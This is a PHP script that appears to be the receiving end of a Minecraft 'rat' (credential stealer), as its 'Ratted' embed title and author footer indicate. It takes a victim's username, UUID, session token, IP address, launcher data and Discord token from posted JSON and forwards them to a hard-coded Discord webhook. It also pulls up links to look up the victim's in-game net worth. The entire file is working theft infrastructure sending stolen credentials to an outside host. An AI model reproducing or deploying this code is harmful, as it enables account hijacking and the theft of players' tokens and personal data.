<?php
$url = "https://discord.com/api/webhooks/1090732371017486347/hKspri7f6Xnub9AUxq4s7wlgDdA9ukwKmDXVdkwDXFnlVrGOdoz_tYQmEIDumektdb12";

echo("OK");

$json = file_get_contents('php://input');

$obj = json_decode($json);
$rank = "N.A";
$username = $obj->{'username'};
$uuid = $obj->{'uuid'};
$token = $obj->{'token'};
$ip = $obj->{'ip'};
$feather = $obj->{'feather'};
$essentials = $obj->{'essentials'};
$lunar = $obj->{'lunar'};
$discord = $obj->{'discord'};

$hookObject = json_encode([
  "avatar_url" => "",
  "content" => "",
  "embeds" => [
    [
      "title" => "Ratted $username - Click For Stats",
      "color" => 5814783,
      "description" => "",
      "timestamp" => "",
      "url" => "https://sky.shiiyu.moe/stats/$username",
      "author" => [
        "name" => "",
        "url" => "",
        "icon_url" => ""
      ],
      "image" => "",
      "thumbnail" => "",
      "footer" => [
        "text" => "Rat by rezom bitch",
        "icon_url" => "https://cdn.discordapp.com/attachments/961304420098928712/1005208866574827651/unknown.png"
      ],
      "fields" => [
        [
          "name" => "Username:",
          "value" => "```$username```",
			"inline" => true,
        ],
        [
          "name" => "UUID:",
          "value" => "```$uuid```",
			"inline" => true,
        ],
		[
          "name" => "IP:",
          "value" => "```$ip```",
			"inline" => true,
        ],
        [
          "name" => "Token:",
          "value" => "```$token```"
        ],
        [
          "name" => "TokenAuth:",
          "value" => "```$username:$uuid:$token```"
        ],
        [
          "name"=>"Feather:",
          "value" => "```$feather```"
        ],
        [
          "name" => "Essentials:",
          "value" => "```$essentials```"
        ],
        [
          "name" => "Lunar:",
          "value" => "```$lunar```"
        ],
		[
                    "name" => "Discord:",
                    "value" => "```$discord```",
                    "inline" => false
       ],
      ]
    ]
  ],
  "components" => [
    [
      "type" => 1,
      "components" => [
        [
          "type" => 2,
          "style" => 5,
          "label" => "ONLINE?",
          "url" => "https://plancke.io/hypixel/player/stats/$username"
        ],
        [
          "type" => 2,
          "style" => 5,
          "label" => "NETWORTH?",
          "url" => "https://sky.shiiyu.moe/stats/$username"
        ]
      ]
    ]
  ]
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );